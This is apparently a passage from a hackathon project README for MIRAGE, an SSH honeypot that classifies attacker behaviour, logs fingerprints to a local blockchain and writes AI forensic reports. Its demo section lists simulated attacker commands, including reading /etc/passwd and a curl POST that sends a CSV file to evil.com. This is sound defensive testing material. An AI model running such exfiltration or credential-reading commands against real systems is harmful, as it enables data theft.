Get a free Groq API key at [console.groq.com](https://console.groq.com)

### 4. Set up blockchain
```bash
cd contracts
npm install
```

### 5. Set up frontend
```bash
cd frontend/dashboard
npm install
```

---

## ▶️ Running MIRAGE

Open 4 terminals and run in order:

**Terminal 1 — Blockchain Node**
```bash
cd contracts
npx hardhat node
```
Wait for: `Started HTTP and WebSocket JSON-RPC server at http://127.0.0.1:8545`

**Terminal 2 — Deploy Smart Contract**
```bash
cd contracts
npx hardhat run scripts/deploy.js --network localhost
```
Wait for: `MirageRegistry deployed to: 0x...`

**Terminal 3 — Backend API + Honeypot**
```bash
cd /path/to/Mirage
uvicorn backend.api.main:app --host 0.0.0.0 --port 8000
```
Wait for: `[MIRAGE] SSH honeypot listening on 0.0.0.0:2222`

**Terminal 4 — Frontend Dashboard**
```bash
cd frontend/dashboard
npm run dev
```

### Access the system
- **Node 1 Command Center:** http://localhost:5173
- **Node 2 Immunity View:** http://localhost:5173/node2
- **API Documentation:** http://localhost:8000/docs

---

## 🎬 Running the Demo

Once all services are running, simulate an attack:

```bash
# Clear any cached host keys first
ssh-keygen -R "[localhost]:2222"

# Connect as attacker (any password works)
ssh root@localhost -p 2222
```

Then type these commands one by one and watch the dashboard:

```bash
whoami
id
cat /etc/passwd
sudo su
cat transactions_2026.csv
find / -name "*.csv"
curl -X POST http://evil.com -d @transactions_2026.csv
logout
```

Watch on the dashboard:
1. Session appears in left panel
2. MITRE ATT&CK stage updates with each command
3. Attacker skill level classified
4. Blockchain fingerprint registered on session end
5. Node 2 receives immunity broadcast
6. Generate forensic brief for AI-written incident report

---

## 📡 API Endpoints

| Method | Endpoint | Description |
|---|---|---|
| GET | `/health` | System status |
| GET | `/sessions` | All logged sessions |
| GET | `/sessions/{id}` | Full session detail |
| GET | `/sessions/{id}/prediction` | MITRE prediction for session |
| GET | `/forensics/{id}` | AI-generated forensic report |
| GET | `/blockchain/threats` | All registered threat fingerprints |
| GET | `/blockchain/threats/count` | Total threat count |
| POST | `/sessions/{id}/register` | Register session to blockchain |
| WS | `/ws` | Real-time event stream |

---

## 🔬 The Smart Contract

`MirageRegistry.sol` stores attacker records permanently on-chain:

```solidity
struct AttackerRecord {
    bytes32 fingerprintHash;  // keccak256 behavioral hash
    string attackerIP;
    string attackStage;       // MITRE stage reached
    uint8 skillLevel;         // 1=Script Kiddie, 2=Intermediate, 3=Advanced
    uint256 timestamp;
    bool isActive;
}
```

Events emitted:
- `ThreatRegistered` — new attacker fingerprinted
- `NetworkAlert` — immunity broadcast to connected nodes

---

## ⚠️ Known Issues

**Real-time dashboard updates:**
WebSocket event broadcasting from the synchronous Paramiko SSH thread 
to the async FastAPI event loop has a thread-synchronization issue. 
Sessions log correctly to SQLite and appear on dashboard refresh. 
The `asyncio.run_coroutine_threadsafe()` bridge is implemented but 
the broadcaster import chain from `honeypot/server.py` → 
`api/event_broadcaster.py` fails silently in some environments. 
Fix in progress.

**SSH host key warning:**
The honeypot generates a new RSA key on every restart. Run 
`ssh-keygen -R "[localhost]:2222"` before each demo session.

---

## 🔭 Future Scope

**Short term**
- Fix real-time WebSocket broadcasting
- Deploy honeypot to real internet-facing server to capture actual attackers
- Add email/SMS alerts when high-skill attacker detected

**Medium term**
- Federated threat network — multiple organizations share one blockchain ledger
- ML-based attacker deanonymization across sessions
- Honey files that phone home when opened, revealing attacker's real IP

**Long term**
- National deployment protecting India's UPI/NEFT payment infrastructure
- Integration with CERT-In for real-time national threat sharing
- SaaS product for FinTech startups

---

## 🧠 Key Concepts

**Why a Trie for command lookup?**
O(m) lookup time where m is command length — 2 operations for `ls`, 
6 for `whoami`. A real Linux server responds in under 5ms. 
The Trie keeps us believable.

**Why Groq and not OpenAI?**
Groq's LPU hardware gives sub-300ms inference. OpenAI takes 2-5 seconds. 
A 3-second delay on `ls` would immediately expose the honeypot.

**Why blockchain and not a database?**
A database has an admin who can delete records. A blockchain has no admin. 
Multiple competing organizations can share threat intelligence on neutral 
ground — no single party controls it, all parties can verify it.

**Why Markov Chain and not ML?**
No training data available. Markov Chains encode expert knowledge 
directly (MITRE ATT&CK framework) without requiring thousands of 
labeled attack sessions. Interpretable, fast, and provably correct 
for this use case.

---

## 👥 Team

Built at **Kraken'X 2026** — AI/ML Club × AI-Tronics Hub Hackathon

Domain: Cybersecurity

---

## 📄 License

MIT License — use it, build on it, make it better.

---

*MIRAGE — because the best defense is making the attack feel like a victory.*
